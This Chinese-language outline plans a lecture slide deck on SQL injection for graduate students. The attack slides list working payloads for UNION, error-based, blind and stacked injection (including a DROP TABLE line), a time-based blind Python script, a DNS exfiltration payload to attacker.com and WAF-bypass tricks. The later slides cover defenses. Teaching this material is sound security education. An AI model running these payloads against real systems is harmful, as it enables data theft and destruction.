# SQL注入讲学PPT - 页面级规划草案

## PPT信息

- **主题**：SQL注入攻击与防御全面解析
- **受众**：研究生和讲师
- **总页数**：32页
- **风格**：案例分析型

---

## 第一部分：开篇（4页）

### 第1页：封面

- **标题**：SQL注入攻击与防御全面解析
- **副标题**：从原理到实战，从攻击到防御
- **目标受众**：研究生 · 讲师
- **视觉元素**：锁与数据库图标的组合，体现安全主题

### 第2页：目录

- **标题**：内容纲要
- **内容**：
  - 第一章：概述与现状（为什么SQL注入仍是头号威胁）
  - 第二章：攻击原理（漏洞是如何产生的）
  - 第三章：注入分类（四大基础类型+高级技术）
  - 第四章：实战案例（CTF题目+真实漏洞）
  - 第五章：防御实践（多层防护体系）
  - 第六章：总结与资源
- **设计建议**：使用数字编号+图标区分章节

### 第3页：SQL注入现状

- **标题**：Web安全的"常青树"——SQL注入威胁依旧
- **内容要点**：
  - OWASP Top 10 长期位列前三
  - 2024-2025年重大泄露事件（某电商、某政务系统）
  - 为什么仍然流行：攻击门槛低、危害大、利用链长
- **案例**：数据泄露统计图表

### 第4页：危害概览

- **标题**：SQL注入能做什么？
- **内容要点**（用图标展示）：
  - 🔓 绕过身份认证
  - 📊 窃取数据库敏感数据
  - ✏️ 篡改数据库内容
  - 🗄️ 执行系统命令（文件读写、命令执行）
  - 💀 在某些配置下可完全控制服务器
- **设计**：使用醒目的图标+简短说明

---

## 第二部分：原理篇（5页）

### 第5页：核心原理

- **标题**：SQL注入的核心原理
- **核心概念**：代码与数据的边界混淆
- **内容**：
  - 正常流程：用户输入 → 数据 → SQL执行
  - 注入流程：用户输入 → 代码+数据 → SQL执行被篡改
- **关键点**：用户输入被当作SQL代码执行，而非纯粹的数据
- **代码对比**：

  ```sql
  -- 正常查询
  SELECT * FROM users WHERE id = 1

  -- 注入后
  SELECT * FROM users WHERE id = 1' UNION SELECT password FROM admin--
  ```

### 第6页：漏洞产生的四层原因

- **标题**：为什么会产生SQL注入漏洞？
- **内容**（四层递进）：
  1. **输入验证缺失**
     - 未过滤特殊字符：'、;、--、/\*
     - 未实施类型检查
     - 未限制输入长度
  2. **查询构建错误**
     - 字符串拼接构建SQL
     - 动态SQL未参数化
  3. **错误配置**
     - 数据库错误直接返回前端
     - 过高权限的数据库账户
  4. **安全意识不足**
     - 开发人员缺乏安全培训
     - 未进行代码安全审计

### 第7页：危险代码示例

- **标题**：这些代码很危险！
- **左侧（危险）**：
  ```php
  // PHP - 危险！
  $sql = "SELECT * FROM users
          WHERE username='$user'
          AND password='$pwd'";
  ```
  ```python
  # Python - 危险！
  sql = f"SELECT * FROM products
          WHERE name LIKE '%{keyword}%'"
  ```
  ```java
  // Java JDBC - 危险！
  String sql = "SELECT * FROM orders
                WHERE id=" + orderId;
  ```
- **右侧（后果）**：每种语言配一个注入成功示例

### 第8页：安全代码示例

- **标题**：正确的写法是这样的
- **对应安全写法**：
  ```php
  // PHP PDO - 安全
  $stmt = $pdo->prepare(
    "SELECT * FROM users WHERE username=?");
  $stmt->execute([$user]);
  ```
  ```python
  # Python - 安全
  cursor.execute(
    "SELECT * FROM products WHERE name LIKE %s",
    (f"%{keyword}%",))
  ```
  ```java
  // Java JDBC - 安全
  String sql = "SELECT * FROM orders WHERE id=?";
  PreparedStatement ps = conn.prepareStatement(sql);
  ps.setInt(1, orderId);
  ```
- **设计**：左右对比，用红色标记危险部分，绿色标记安全部分

### 第9页：原理小结

- **标题**：原理篇小结
- **要点回顾**（简洁的总结表格或思维导图）：
  - 核心：用户输入被当作SQL代码执行
  - 根因：输入验证缺失 + 字符串拼接SQL
  - 防御核心：命令与数据分离

---

## 第三部分：注入分类篇（12页）

### 第10页：分类概览

- **标题**：SQL注入的"家族图谱"
- **内容**（树状图或分类卡片）：
  - **按反馈分类**
    - 有回显：联合查询、报错注入
    - 无回显：布尔盲注、时间盲注
  - **按技术分类**
    - 基础：联合查询、报错、布尔、时间
    - 高级：堆叠、二次注入、DNSlog、ORM注入
  - **按攻击目标**
    - 数据型：获取数据
    - 命令型：文件读写、系统命令
- **视觉**：使用家族树或分类图形式展示

### 第11页：联合查询注入 - 原理

- **标题**：联合查询注入（Union-Based Injection）
- **核心原理**：
  - 利用UNION操作符合并查询结果
  - 需满足：列数相同、数据类型兼容
- **攻击条件**：
  1. 知道原始查询的列数
  2. 知道目标表的列数和类型
  3. 原始查询有回显点
- **图示**：SQL语句分解图，展示UNION如何拼接

### 第12页：联合查询注入 - 实战

- **标题**：联合查询注入实战步骤
- **攻击流程**（步骤卡片）：
  1. **寻找注入点**：添加单引号触发报错
  2. **判断列数**：ORDER BY 1,2,3...直到报错
  3. **确定回显位置**：UNION SELECT 1,2,3...
  4. **收集数据库信息**：version(), database(), user()
  5. **获取表名**：information_schema.tables
  6. **获取列名**：information_schema.columns
  7. **提取数据**：UNION SELECT username, password FROM admin
- **代码示例**：`/user.php?id=-1' UNION SELECT 1,2,3--`

### 第13页：报错注入 - 原理

- **标题**：报错注入（Error-Based Injection）
- **核心原理**：通过构造恶意输入触发数据库错误，从错误信息中提取数据
- **适用场景**：
  - 页面不显示查询结果
  - 但会显示数据库错误信息
- **常用函数**：
  - `extractvalue()` - MySQL
  - `updatexml()` - MySQL
  - `floor()` - MySQL
  - `dbms_pipe.receive_message()` - Oracle

### 第14页：报错注入 - 示例

- **标题**：报错注入函数演示
- **代码示例**（每个函数一行）：

  ```sql
  -- extractvalue报错（最大32位）
  ' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--

  -- updatexml报错
  ' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--

  -- floor报错
  ' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),floor(rand()*2))x FROM information_schema.tables GROUP BY x)a)--
  ```

- **注意**：报错注入有32字符限制，需用substr分段提取

### 第15页：布尔盲注 - 原理

- **标题**：布尔盲注（Boolean-Based Blind Injection）
- **核心原理**：
  - 注入"真/假"条件，根据页面响应差异判断
  - 页面返回"正常" = 条件为真
  - 页面返回"异常/空白" = 条件为假
- **判断逻辑**：
  ```
  输入：1' AND 1=1 --+  → 页面正常
  输入：1' AND 1=2 --+  → 页面异常
  结论：存在注入漏洞
  ```

### 第16页：布尔盲注 - 实战

- **标题**：布尔盲注实战：猜解数据库名
- **步骤演示**：

  ```sql
  -- 判断数据库名长度
  ' AND length(database())>5 --    → 正常
  ' AND length(database())>10 --   → 异常
  -- 结论：数据库名长度在6-10之间

  -- 逐位猜解第一位
  ' AND substr(database(),1,1)='a' --
  ' AND substr(database(),1,1)='b' --
  ... (实际使用二分法优化)
  ```

- **效率问题**：一位字符最多需要95次请求，需用二分法优化

### 第17页：时间盲注 - 原理

- **标题**：时间盲注（Time-Based Blind Injection）
- **核心原理**：
  - 当布尔盲注失效（页面响应恒定）时
  - 使用延时函数判断条件真假
  - 如果条件为真，让数据库"睡"几秒
- **常用函数**：
  - `SLEEP(seconds)` - MySQL
  - `WAITFOR DELAY` - SQL Server
  - `pg_sleep(seconds)` - PostgreSQL
- **判断逻辑**：
  ```
  输入：1' AND SLEEP(5)--  → 响应延迟5秒
  输入：1' AND 1=2 --      → 无延迟
  结论：存在注入，且条件判断有效
  ```

### 第18页：时间盲注 - 实战

- **标题**：时间盲注实战脚本
- **Python脚本示例**：

  ```python
  import requests
  import time

  def inject_bool(url, payload):
      start = time.time()
      r = requests.get(url + payload)
      elapsed = time.time() - start
      return elapsed > 5  # 延迟超过5秒返回True

  # 猜解数据库名长度
  for i in range(1, 20):
      payload = f"' AND SLEEP(IF(LENGTH(DATABASE())={i},5,0))--"
      if inject_bool(url, payload):
          print(f"数据库名长度为: {i}")
          break
  ```

- **提示**：实际使用二分法可大幅提升效率

### 第19页：四大基础类型对比

- **标题**：四种基础注入类型对比
- **表格对比**：
  | 类型 | 回显 | 条件判断 | 速度 | 适用场景 |
  |------|------|----------|------|----------|
  | UNION注入 | ✅ 有 | - | 快 | 有回显位 |
  | 报错注入 | ⚠️ 错误信息 | - | 快 | 有错误回显 |
  | 布尔盲注 | ❌ 无 | 页面差异 | 中 | 有页面状态差异 |
  | 时间盲注 | ❌ 无 | 时间延迟 | 慢 | 完全无回显 |
- **选择建议**：优先UNION/报错，迫不得已才用盲注

### 第20页：堆叠注入 - 原理

- **标题**：堆叠注入（Stacked Queries）
- **核心原理**：使用分号(;)同时执行多条SQL语句
- **前置条件**：数据库支持多语句执行（PHP mysql_query不支持，mysqli_multi_query支持）
- **示例**：
  ```sql
  ; DROP TABLE users--  -- 删除表
  ; SELECT * FROM users;--  -- 查询数据
  ```
- **优势**：可以执行任意多语句，攻击面更大

### 第21页：堆叠注入 - CTF案例

- **标题**：CTF实战：supersqli（过滤了SELECT怎么办？）
- **背景**：关键词过滤（select、update、delete等被preg_match拦截）
- **攻击思路**：
  1. `1';show tables;` - 列出所有表
  2. 发现flag表名：1919810931114514
  3. 利用rename修改表名：
     - `1';rename words to test;` - 原有表改名
     - `1';rename 1919810931114514 to words;` - flag表改成words
  4. `1';show columns from words;` - 查看flag字段
- **核心思想**：不查flag表，让flag表变成能直接输出的表

---

## 第四部分：高级技术篇（6页）

### 第22页：二次注入

- **标题**：二次注入（Second-Order SQL Injection）
- **核心原理**：
  1. 攻击者将恶意数据"存储"到数据库（第一次注入）
  2. 存储的数据在后续查询中被"触发"执行（第二次）
- **典型场景**：
  - 用户注册：存储型XSS-like的数据
  - 文章发布：新闻系统
  - 密码修改：修改密码时触发
- **示例**：
  ```
  1. 注册用户名：admin'--
  2. 数据库存储：admin'--
  3. 修改密码时查询：UPDATE users SET pwd='123' WHERE username='admin'--'
  4. 结果：所有admin用户的密码被修改
  ```

### 第23页：DNSlog注入

- **标题**：DNSlog注入——外带数据的妙招
- **适用场景**：目标机无法回显数据，但可以发起DNS请求
- **核心原理**：
  - 利用DNS查询将数据带出来
  - attacker.com 的DNS日志记录查询信息
- **工具**：SQLMap --dns-domain、MySQL load_file()
- **示例**：
  ```sql
  ' AND (SELECT load_file(concat('\\\\',(SELECT user()),'.attacker.com\\a')))--
  ```
- **可视化**：数据流图，从注入点到DNS日志

### 第24页：WAF绕过基础

- **标题**：WAF绕过——大小写与编码
- **常见绕过技术**：
  1. **大小写混合**：
     - `UNION SELECT` → `UnIoN SeLeCt`
  2. **URL编码**：
     - 单引号 ' → %27
     - 空格 → %20
  3. **双重URL编码**：
     - ' → %2527
  4. **十六进制**：
     - admin → 0x61646d696e
- **示例对比**：
  ```
  原始：' OR 1=1 --
  绕过：' OR 1=1 -- (大小写)
        %27 OR 1=1 -- (URL编码)
  ```

### 第25页：WAF绕过进阶

- **标题**：WAF绕过——注释与替代
- **技术手段**：
  1. **SQL注释替代空格**：
     - `UNION/**/SELECT` 替代 `UNION SELECT`
     - `UNION/*!SELECT*/` MySQL内部注释
  2. **注释分离关键字**：
     - `S/*comment*/ELECT` → SELECT
  3. **空白符替换**：
     - TAB、换行、%09、%0A、%0B、%0C、%0D
  4. **等价函数替代**：
     - `SUBSTRING()` → `MID()` → `SUBSTR()`
     - `CONCAT()` → `GROUP_CONCAT()`
     - `ASCII()` → `ORD()`
- **实战**：配合使用多种绕过技术

### 第26页：ORM注入风险

- **标题**：ORM不是万能的——HQL注入
- **背景**：很多人以为用ORM就不会有SQL注入
- **危险示例**（Hibernate HQL）：
  ```java
  // 危险！HQL也支持字符串拼接
  Query query = session.createQuery(
    "FROM User WHERE name='" + name + "'"
  );
  ```
- **安全写法**：
  ```java
  // 安全：使用参数
  Query query = session.createQuery(
    "FROM User WHERE name=:name"
  );
  query.setParameter("name", name);
  ```
- **提示**：ORM框架本身安全，但手写原生SQL或错误使用仍可能注入

### 第27页：高级技术小结

- **标题**：高级技术要点回顾
- **思维导图式总结**：
  - **数据外带**：DNSlog、二次注入
  - **绕过防护**：编码、注释、替代
  - **特殊场景**：ORM、JSON注入、NoSQL注入
- **提醒**：高级技术需要扎实的基础，勿忘根本

---

## 第五部分：防御实践篇（6页）

### 第28页：防御策略概览

- **标题**：SQL注入防御——多层防护体系
- **内容**（金字塔或同心圆图）：
  - **最核心**：参数化查询/预编译
  - **第二层**：输入验证 + 最小权限
  - **第三层**：WAF + 错误隐藏
  - **第四层**：定期审计 + 监控告警
- **核心理念**：Defense in Depth（纵深防御）

### 第29页：参数化查询详解

- **标题**：参数化查询——根本解决方案
- **为什么有效**：
  - SQL结构在编译时确定
  - 用户输入只作为数据传递
  - 永远不会被解释为SQL代码
- **多语言示例**（PHP/Java/Python三栏对比）：
  - PDO、JdbcTemplate、SQLAlchemy
- **关键点**：不要在任何地方拼接SQL字符串

### 第30页：最小权限原则

- **标题**：最小权限——降低攻击影响
- **数据库账户权限分级**：
  ```
  Web应用账户：
  ├── SELECT（只读）
  ├── INSERT（仅必要表）
  ├── UPDATE（仅必要表）
  └── ❌ DROP/DELETE/FILE/EXECUTE（禁用）
  ```
- **具体措施**：
  - 应用账户与管理员账户分离
  - 禁用`INTO OUTFILE`等文件操作函数
  - 禁用存储过程（如果不需要）
  - 生产环境禁止`services`账户

### 第31页：错误处理与WAF

- **标题**：错误隐藏 + WAF部署
- **错误处理**：
  - 生产环境禁止数据库错误回显
  - 统一返回"操作失败，请稍后重试"
  - 记录详细错误日志到服务器端
- **WAF部署**：
  - ModSecurity（开源WAF）
  - 云WAF（阿里云、腾讯云等）
  - 常见规则：过滤UNION、SELECT、'、--等关键词
- **注意事项**：WAF不是万能的，可能被绕过，需配合代码层防御

### 第32页：代码审计清单

- **标题**：代码安全审计——检查清单
- **审计要点**：
  - [ ] 所有SQL查询是否使用参数化？
  - [ ] 是否有字符串拼接SQL的地方？
  - [ ] 用户输入是否经过验证？
  - [ ] 数据库账户权限是否最小化？
  - [ ] 错误信息是否脱敏？
  - [ ] 是否使用了安全的ORM用法？
- **工具推荐**：
  - 静态分析：SonarQube、Fortify
  - 渗透测试：Burp Suite、sqlmap、Acunetix

---

## 第六部分：总结与资源（3页）

### 第33页：总结

- **标题**：知识要点回顾
- **核心要点**（简洁的三点总结）：
  1. **攻击**：SQL注入源于"数据当代码执行"
  2. **分类**： UNION/报错/布尔盲注/时间盲注 + 堆叠/二次/DNSlog
  3. **防御**：参数化查询是根本，多层防护是保障
- **关键公式**：
  ```
  安全代码 = 参数化查询 + 输入验证 + 最小权限 + 错误隐藏
  ```

### 第34页：最新趋势

- **标题**：SQL注入的最新威胁与防御趋势
- **新威胁**：
  - NoSQL注入（MongoDB等）
  - GraphQL注入
  - 供应链漏洞中的SQL注入
  - AI生成代码带来的新风险
- **防御趋势**：
  - 运行时保护（RASP）
  - AI驱动的异常检测
  - 自动化代码审计

### 第35页：学习资源

- **标题**：继续深入学习的资源
- **资源列表**：
  - **书籍**：《Web应用安全权威指南》、《SQL注入防御与绕过》
  - **在线平台**：OWASP、WebGoat、CTFHub
  - **工具文档**：SQLMap、Burp Suite、Havij
  - **社区**：先知社区、安全客、补天
- **实战建议**：CTF刷题 + 靶机练习 + 合法渗透测试

### 第36页：结束页

- **标题**：谢谢聆听
- **副标题**：问题与讨论
- **联系方式**：邮箱/二维码（可选）

---

## 附录：页面设计备注

### 配色方案

- **主色**：#1a237e（深蓝）- 专业、技术
- **危险色**：#d32f2f（红）- 攻击、漏洞
- **安全色**：#388e3c（绿）- 防御、安全
- **警示色**：#f57c00（橙）- 注意、绕过
- **背景色**：#f5f5f5（浅灰）- 便于阅读

### 字体建议

- **标题**：思源黑体/微软雅黑 Bold
- **正文**：思源黑体/微软雅黑 Regular
- **代码**：Consolas / Source Code Pro / Fira Code

### 图标建议

- 使用Font Awesome或Material Design图标
- 攻击相关：🔓 💀 ⚠️
- 防御相关：🛡️ ✅ 🔒
- 数据库：🗄️ 📊

---

_规划草案生成日期：2026-03-27_
_总页数：36页_
